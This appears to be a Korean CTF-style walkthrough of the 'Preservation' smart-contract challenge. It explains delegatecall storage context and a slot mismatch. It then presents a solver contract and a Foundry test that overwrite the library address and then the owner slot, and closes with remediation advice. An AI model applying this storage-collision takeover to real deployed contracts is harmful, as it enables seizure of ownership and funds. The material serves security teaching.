# 16. Preservation

[English](../en/16_Preservation.md) | [한국어](16_Preservation.md)

## 문제 목표

대상의 `delegatecall` 스토리지 동작을 이용해 `owner`를 플레이어로 변경합니다.

## 핵심 개념

- `delegatecall`
- 스토리지 문맥
- 스토리지 배치 호환성
- 함수 selector
- 업그레이드 및 라이브러리 설계

## delegatecall 원리

`delegatecall`은 다른 주소의 코드를 실행하면서 호출자의 문맥을 유지합니다.

```text
실행하는 코드:       피호출자의 코드
스토리지 읽기/쓰기:  호출자의 스토리지
address(this):       호출자
msg.sender:          최초 호출자
msg.value:           최초 전달값
```

호출된 코드는 라이브러리 자신의 스토리지를 바꾸지 않습니다. 코드가 사용하는 슬롯 번호가 `Preservation`의 스토리지에 적용됩니다.

## 스토리지 배치 불일치

대상의 배치는 다음과 같습니다.

| 슬롯 | `Preservation` 변수 |
| :---: | :--- |
| `0` | `timeZone1Library` |
| `1` | `timeZone2Library` |
| `2` | `owner` |
| `3` | `storedTime` |

기존 라이브러리에는 변수가 하나뿐입니다.

| 슬롯 | `LibraryContract` 변수 |
| :---: | :--- |
| `0` | `storedTime` |

`setFirstTime(value)`가 `LibraryContract.setTime(value)`으로 delegatecall하면 라이브러리 코드는 슬롯 `0`에 기록합니다. delegatecall 문맥에서는 `Preservation.timeZone1Library`가 `value`로 바뀝니다.

## 솔버 스토리지 배치

솔버는 처음 세 슬롯을 대상과 의도적으로 맞춥니다.

```solidity
address public timeZone1Library; // 슬롯 0
address public timeZone2Library; // 슬롯 1
uint256 public ownerSlot;        // 슬롯 2

function setTime(uint256 _time) public {
    ownerSlot = _time;
}
```

슬롯 `0`이 솔버를 가리킨 뒤 다시 `setFirstTime()`을 호출하면 솔버의 `setTime()`으로 delegatecall됩니다. 이 구현은 슬롯 `2`에 기록하며 대상에서는 `owner` 슬롯에 해당합니다.

## 풀이 흐름

```text
초기 슬롯 0 = LibraryContract 주소
초기 슬롯 2 = 기존 owner
        ↓
플레이어가 setFirstTime(uint160(solver)) 호출
        ↓
LibraryContract.setTime이 delegatecall로 실행
        ↓
슬롯 0 기록으로 target.timeZone1Library가 solver로 변경
        ↓
플레이어가 setFirstTime(uint160(player)) 재호출
        ↓
대상이 PreservationSolver.setTime으로 delegatecall
        ↓
솔버의 슬롯 2 기록으로 target.owner가 player로 변경
```

## Foundry 테스트

```solidity
assertEq(target.owner(), address(this));

vm.startPrank(player);
target.setFirstTime(uint256(uint160(address(solver))));
assertEq(target.timeZone1Library(), address(solver));

target.setFirstTime(uint256(uint160(player)));
vm.stopPrank();

assertEq(target.owner(), player);
```

중간 assertion은 첫 번째 delegatecall이 이후 실행 경로를 솔버로 변경했음을 증명합니다.

## 문제의 근본 원인

대상은 변경 가능한 주소로 delegatecall하면서 구현 코드가 호환되는 스토리지 배치를 사용할 것이라고 가정합니다. 기존 라이브러리의 슬롯 `0`은 대상이 의도한 `storedTime` 슬롯과 대응하지 않습니다.

## 권장 개선 방법

- 가능한 경우 상태가 없는 라이브러리 연산에는 Solidity `library`를 사용합니다.
- delegatecall 구현과 호출자가 명시적으로 공유하는 스토리지 배치를 유지합니다.
- 구현 주소를 보호된 위치나 immutable 값으로 관리합니다.
- 구현 변경은 강력한 접근 제어와 timelock으로 제한합니다.
- delegatecall 반환값을 검증합니다.
- 검증된 프록시 스토리지 표준과 자동 스토리지 배치 검사를 사용합니다.

## 테스트 실행

```bash
forge test --match-path test/16_Preservation.t.sol -vvv
```

## 학습 정리

`delegatecall`은 스토리지가 아니라 코드만 빌립니다. 위임된 코드의 모든 스토리지 접근은 호출자 배치를 기준으로 해석되므로 슬롯 불일치가 데이터와 이후 실행 경로를 함께 바꿀 수 있습니다.
